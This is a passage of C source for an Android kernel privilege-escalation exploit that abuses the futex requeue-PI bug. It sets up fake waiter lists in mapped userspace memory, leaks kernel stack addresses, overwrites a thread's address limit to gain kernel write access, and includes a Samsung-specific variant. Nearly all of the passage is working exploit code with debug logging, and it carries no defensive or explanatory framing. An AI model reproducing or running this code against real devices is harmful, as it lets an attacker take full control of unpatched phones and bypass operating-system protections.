    // Alternative list

    *((unsigned long *)(hacked_node - 4)) = 0x81;
    *((unsigned long *) hacked_node) = hacked_node + 0x20;
    *((unsigned long *)(hacked_node + 8)) = hacked_node + 0x28;

    *((unsigned long *)(hacked_node + 0x1c)) = 0x85;
    *((unsigned long *)(hacked_node + 0x24)) = hacked_node;
    *((unsigned long *)(hacked_node + 0x2c)) = hacked_node + 8;

}

void reset_hacked_list(unsigned long hacked_node) {

    *((unsigned long *)(hacked_node - 4)) = 0x81;
    *((unsigned long *) hacked_node) = hacked_node + 0x20;
    *((unsigned long *)(hacked_node + 8)) = hacked_node + 0x28;

    *((unsigned long *)(hacked_node + 0x1c)) = 0x85;
    *((unsigned long *)(hacked_node + 0x24)) = hacked_node;
    *((unsigned long *)(hacked_node + 0x2c)) = hacked_node + 8;

}


void *trigger(void *arg) {
    int ret;
    unsigned long readval;
    pid_t pid;
    int i, k;
    char buf[0x1000];
    int tid_counter = 0;
    unsigned int addr, setaddr;

    setpriority(PRIO_PROCESS, 0, 5);

    LOGD("[TRIGGER] Trigger pid %x\n", gettid());

    // Acquire lock2 so when the thread will be requeued from lock1 to lock2 will be put in the queue
    syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

    // Now requeue the stack_modifier thread from lock1 to lock2
    while (1) {
        ret = syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
        if (ret == 1) {
            LOGD("[TRIGGER] Stack modifier requeued\n");
            break;
        }
        usleep(10);
    }

    // Add a couple of waiters in the vulnerable kernel list

    wake_actionthread(3);
    pid6 = wake_actionthread(6);
    pid7 = wake_actionthread(7);

    // Now lock2 has this wait list: |6|<->|7|<->|12|

    lock2 = 0;

    // Trigger the vulnerability: requeue the stack modifier from lock2 to lock2
    syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);

    // If everything went as expected at this point the stack modifier is going tu use a syscall to modify
    // the wait list for lock2

    // Be sure he finished
    sleep(2);

    // Now the new wait_list for lock2 should be: |6|<->|7|<->|-1..|<->hacked_list

    // We can now start the list manipulation creating new node controlled by us
    // We build two chain: hacked_node and hacked_node_alt
    // Sometime the alignament of iovstack could be different so prio_list->next and prio_list->prev
    // could be switched. 

    create_hacked_list(hacked_node, hacked_node_alt);

    // Now the new wait_list for lock2 should be: |6|<->|7|<->|-1..|<->|9|<->|13|
    // with waiters with prio 9 and 13 in our userspace

    // Lets do something of interesting. Add a waiter and check wich list we are using.

    readval = *((unsigned long *)hacked_node);
    tid_11 = wake_actionthread(11);

    if (*((unsigned long *)hacked_node) == readval) {
        LOGD("[TRIGGER] Using hacked_node_alt.\n");
        hacked_node = hacked_node_alt;
    }

    // Is it patched?
    if (*((unsigned long *)hacked_node) == readval) {
        LOGD("[TRIGGER] Device seems to be patched.\n");
        send_pipe_msg(ERROR);
        return 0;
    }

    // Save the waiter address
    t11 = *((unsigned long *)hacked_node);

    // Try to find a thred we can hack
    for(k=0; k<20; k++)  {

        is_kernel_writing = (pthread_mutex_t *)malloc(4);
        pthread_mutex_init(is_kernel_writing, NULL);

        // Reset the hacked list
        reset_hacked_list(hacked_node);

        // Leak a kernel stack pointer (a new created waiter)
        pid = wake_actionthread(11);

        // Now we have the pointer of a waiter allocated on the stack. We can calculate the
        // thread_info struct in the kernel for that last called thread
        first_kstack_base = leaker_kstack_base = *((unsigned long *)hacked_node) & 0xffffe000;

        LOGD("[TRIGGER] Send a signal to the first evil thread\n");
        pthread_mutex_lock(&is_thread_awake_lock);

        kill(pid, 12);

        pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
        pthread_mutex_unlock(&is_thread_awake_lock);
        LOGD("[TRIGGER] First evil thread is now waiting\n");

        sleep(1);

        LOGD("[TRIGGER] First kernel stack base found at 0x%x\n", (unsigned int) first_kstack_base);

        // Samsung exploitation
        if(config_new_samsung) {
            LOGD("[TRIGGER] Starting samsung...\n");
            addr = (unsigned long)mmap((unsigned long *)0xbef000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

            LOGD("[TRIGGER] mmap done\n");
            if (addr != 0xbef000) {
                continue;
            }

            reset_hacked_list(0xbeffe0);
            reset_hacked_list(hacked_node);

            *((unsigned long *)0xbf0004) = first_kstack_base + config_offset + 1;
            *((unsigned long *)hacked_node) = 0xbf0000;

            // Keep trace of the pending waiters
            remove_pid[remove_counter] = wake_actionthread(10);

            readval = *((unsigned long *)0x00bf0004);

            remove_waiter[remove_counter] = readval;
            remove_counter++;

            munmap((unsigned long *)0xbef000, 0x2000);

            LOGD("[TRIGGER] First step done: %lx\n", readval);

            readval <<= 8;      
            if (readval < KERNEL_START) {	
                setaddr = (readval - 0x1000) & 0xfffff000;
                addr = (unsigned long)mmap((unsigned long *)setaddr, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

                if (addr != setaddr) {
                    continue;
                }

                reset_hacked_list(readval - 0x20);
                *((unsigned long *)(readval + 4)) = first_kstack_base + config_offset;
                *((unsigned long *)hacked_node) = readval;

                remove_pid[remove_counter] = wake_actionthread(10);

                readval = *((unsigned long *)(readval + 4));
                // Save the waiter address
                remove_waiter[remove_counter] = readval;
                remove_counter++;

                munmap((unsigned long *)setaddr, 0x2000);

                LOGD("[TRIGGER] Samsung done: %lx\n", readval);
            }
        }
        else {
            reset_hacked_list(hacked_node);

            // Use the prev pointer to execute a write in kernel space (the thread addr_limit)
            *((unsigned long *)(hacked_node + 0x24)) = first_kstack_base + 8;

            tid_12 = wake_actionthread(12); // Will be in the user space hacked list

            readval = *((unsigned long *)(hacked_node + 0x24));
            LOGD("[TRIGGER] New first stack limit 0x%x\n", (unsigned int)readval);

            remove_pid[remove_counter] = tid_12;
            remove_waiter[remove_counter] = readval;
            remove_counter++;
        }

        // At this point we have a thread with an addr_limit = readval waiting to write something to us.
        // Try to create a new thread to be modified by the first one
        for(i = 0; i < loop_limit; i++) {
            reset_hacked_list(hacked_node);
            pid = wake_actionthread(10); // Will be in the user space hacked list

            LOGD("[TRIGGER] Found value 0x%x with tid %d\n", (unsigned int) *((unsigned long *)hacked_node), pid);
            // Be sure the first can modify the second one
            if (*((unsigned long *)hacked_node) < readval) {

#ifdef DEBUG
                for(k = 0; k < remove_counter; k++) {
                    LOGD("[TRIGGER] Remove tid %d with waiter %x\n", remove_pid[k], (unsigned int) remove_waiter[k]);	  
                }
#endif

                final_kstack_base = *((unsigned long *)hacked_node) & 0xffffe000;
                LOGD("[TRIGGER] Found a good thread to hack: 0x%x\n", (unsigned int) final_kstack_base);
                LOGD("[TRIGGER] Current hacked_node %x\n", (unsigned int) hacked_node);

                pthread_mutex_lock(&is_thread_awake_lock);

                kill(pid, 12);

                pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
                pthread_mutex_unlock(&is_thread_awake_lock);

                sleep(2);

                reset_hacked_list(hacked_node);
                // Now we have a thread waiting to write something in the second thread.
                // The second thread is waiting to receive a signal by the first one

                // Tell the first thread to hack the second one
                write(HACKS_fdm, buf, 0x1000);

                while (1) {
                    sleep(10);
                }
            }
            if(config_force_remove) {
                // Trace the pending waiters
                remove_pid[remove_counter] = pid;
                remove_waiter[remove_counter] = *((unsigned long *)hacked_node);
                remove_counter++;
            }
        }
    }
    stop_for_error();
    return NULL;
}


int waiter_exploit() {

    pthread_t l1, l2, l3;

    LOGV("uid %d\n", getuid());

    if (config_buf[0] == 'c') {
        LOGV("no config supplied %s\n", config_buf);
        return 1;
    }

    config_new_samsung = *(int*)&config_buf[0];
    config_iovstack = *(int*)&config_buf[4];
    config_offset = *(int*)&config_buf[8];
    config_force_remove = *(int*)&config_buf[12];

    pipe(pipe_fd);

    pid_t pipe_pid = fork();
    if(pipe_pid != 0) {
        int pipe_server_ret = start_pipe_server();

        int status;
        waitpid(pipe_pid, &status, 0);
        return pipe_server_ret;
    }

    sleep(2);
    close(pipe_fd[0]);

    // First we create two possible hacked list of waiters.

    addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    hacked_node = addr;
    if ((long)addr >= 0) {
        LOGD("[TOWEL] first mmap failed?\n");
        send_pipe_msg(ERROR);
        return 1;
    }  

    addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
    hacked_node_alt = addr;
    if (addr > 0x110000) {
        LOGD("[TOWEL] second mmap failed?\n");
        send_pipe_msg(ERROR);
        return 1;
    }

    // Start the socket server we will use to hook inside the sendmmsg syscall

    LOGD("[TOWEL] Creating socket\n");
    pthread_create(&l1, NULL, accept_socket, NULL);

    sleep(1);

    LOGD("[TOWEL] Starting exploitation\n");

    pthread_mutex_lock(&done_lock);
    pthread_create(&l2, NULL, stack_modifier, NULL);
    pthread_create(&l3, NULL, trigger, NULL);  
    pthread_cond_wait(&done, &done_lock);

    LOGD("[TOWEL] All Done, exiting PID %d\n", getpid());
    send_pipe_msg(ALL_DONE);
    sleep(1);

    return 0;
}

